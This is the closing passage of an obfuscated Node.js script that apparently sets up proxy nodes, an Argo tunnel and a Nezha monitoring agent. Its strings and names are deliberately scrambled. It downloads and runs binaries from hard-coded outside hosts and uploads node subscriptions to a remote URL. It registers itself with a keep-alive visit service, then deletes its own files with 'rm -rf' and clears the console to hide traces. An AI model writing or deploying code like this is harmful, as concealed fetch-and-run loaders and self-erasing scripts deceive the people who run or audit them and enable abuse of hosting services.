Url','automatic\x20access\x20task\x20added\x20successfully','NEZHA_SERVER','success','ARGO_PORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','?encryption=none&security=tls&sni=','http','\x0a\x20\x20\x20\x20','base64','then','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','8799901vKwuwl','3192007YWjjdK','SUB_PATH','NEZHA_PORT','ARGO_DOMAIN:','https://amd64.ssss.nyc.mn/v1','has','tunnel.yml','win32','https://arm64.ssss.nyc.mn/agent','PROJECT_URL','/vmess-argo','Download\x20','child_process','5hXumRc','Subscription\x20uploaded\x20successfully','Error\x20executing\x20command:\x20','8443','NAME','statSync','https://amd64.ssss.nyc.mn/agent','from','abcdefghijklmnopqrstuvwxyz','forEach','\x20is\x20running','\x0aclient_secret:\x20','UPLOAD_URL','https://ipapi.co/json/','org','send','config.json','match','test','fileName','get','\x20>/dev/null\x202>&1\x20&','/trojan-argo','/api/delete-nodes','arch','Unknown','writeFileSync','stringify','\x20-s\x20','127.0.0.1','\x0avless://','listen','sub','northflank','64qchJwZ','/dev/null','FILE_PATH','aarch64','utf-8','/api/add-subscriptions','axios','2087','443','platform','del\x20/f\x20/q\x20','php\x20running\x20error:\x20','unlinkSync','6KihXrk','2053','message','\x20already\x20exists','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','join','existsSync','unlink','&path=%2Fvless-argo%3Fed%3D2560#','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','split','basename','2083','application/json','\x20>\x20nul\x202>&1','random','vless','substring','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','country_code','true','pop','App\x20is\x20running','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tls','nor.chenbifan.de5.net','Empowerment\x20success\x20for\x20'];_0x31b0=function(){return _0x37641b;};return _0x31b0();}async function uploadNodes(){const _0x465588={_0x2f0c14:0x134,_0x2e1442:0x1a3,_0x448c8d:0x1ce,_0xe3500a:0x1b2,_0x1c0741:0x128},_0x393113=_0x35001c;if(UPLOAD_URL&&PROJECT_URL){const _0x1629a8=PROJECT_URL+'/'+SUB_PATH,_0x3f81a1={'subscription':[_0x1629a8]};try{const _0x5638d9=await axios['post'](UPLOAD_URL+_0x393113(_0x465588._0x2f0c14),_0x3f81a1,{'headers':{'Content-Type':'application/json'}});return _0x5638d9&&_0x5638d9[_0x393113(0x1a0)]===0xc8?(console[_0x393113(_0x465588._0x2e1442)](_0x393113(_0x465588._0x448c8d)),_0x5638d9):null;}catch(_0x2b55a0){if(_0x2b55a0[_0x393113(0x159)]){if(_0x2b55a0['response'][_0x393113(0x1a0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x393113(0x142)](listPath))return;const _0x4cf4c2=fs['readFileSync'](listPath,_0x393113(0x133)),_0x4e408b=_0x4cf4c2['split']('\x0a')['filter'](_0x3fcc48=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3fcc48));if(_0x4e408b[_0x393113(_0x465588._0xe3500a)]===0x0)return;const _0x5c3870=JSON[_0x393113(_0x465588._0x1c0741)]({'nodes':_0x4e408b});try{const _0x4d84e0=await axios[_0x393113(0x16e)](UPLOAD_URL+'/api/add-nodes',_0x5c3870,{'headers':{'Content-Type':_0x393113(0x14a)}});return _0x4d84e0&&_0x4d84e0[_0x393113(0x1a0)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x4d84e0):null;}catch(_0x4f7520){return null;}}else return;}}function cleanFiles(){const _0x562eac={_0x379646:0x138,_0xe2225a:0x141,_0x226004:0x166},_0x2d509d={_0x518191:0x188,_0x1c9e54:0x1a3,_0x28123b:0x153};setTimeout(()=>{const _0x2ef475={_0x270bc6:0x153},_0x53b4a9=_0x326d,_0x1a7945=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1a7945[_0x53b4a9(0x1a9)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1a7945[_0x53b4a9(0x1a9)](phpPath);process[_0x53b4a9(_0x562eac._0x379646)]==='win32'?exec(_0x53b4a9(0x139)+_0x1a7945[_0x53b4a9(0x141)]('\x20')+_0x53b4a9(0x14b),_0x5271a0=>{const _0x42d37c=_0x53b4a9;console['clear'](),console[_0x42d37c(0x1a3)](_0x42d37c(_0x2ef475._0x270bc6)),console[_0x42d37c(0x1a3)](_0x42d37c(0x17e));}):exec('rm\x20-rf\x20'+_0x1a7945[_0x53b4a9(_0x562eac._0xe2225a)]('\x20')+_0x53b4a9(_0x562eac._0x226004),_0x15f1be=>{const _0x2aa0eb=_0x53b4a9;console[_0x2aa0eb(_0x2d509d._0x518191)](),console[_0x2aa0eb(_0x2d509d._0x1c9e54)](_0x2aa0eb(_0x2d509d._0x28123b)),console[_0x2aa0eb(0x1a3)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x951b1f={_0x596e56:0x15e,_0x234c51:0x16e,_0x1a6dc2:0x160,_0xa1d335:0x199,_0x2a7f66:0x13e},_0x9be9ba=_0x35001c;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x9be9ba(_0x951b1f._0x596e56));return;}try{const _0x5bf297=await axios[_0x9be9ba(_0x951b1f._0x234c51)](_0x9be9ba(_0x951b1f._0x1a6dc2),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x9be9ba(0x14a)}});return console[_0x9be9ba(0x1a3)](_0x9be9ba(0x1b4)),_0x5bf297;}catch(_0x2d2216){return console[_0x9be9ba(_0x951b1f._0xa1d335)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2d2216[_0x9be9ba(_0x951b1f._0x2a7f66)]),null;}}async function startserver(){const _0x1a443b={_0x5df034:0x175},_0x5152fe=_0x35001c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x24dd28){console[_0x5152fe(0x199)](_0x5152fe(_0x1a443b._0x5df034),_0x24dd28);}}startserver()['catch'](_0x35ec57=>{const _0x29dad1=_0x35001c;console[_0x29dad1(0x199)](_0x29dad1(0x1a7),_0x35ec57);}),app[_0x35001c(0x12c)](PORT,()=>console[_0x35001c(0x1a3)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
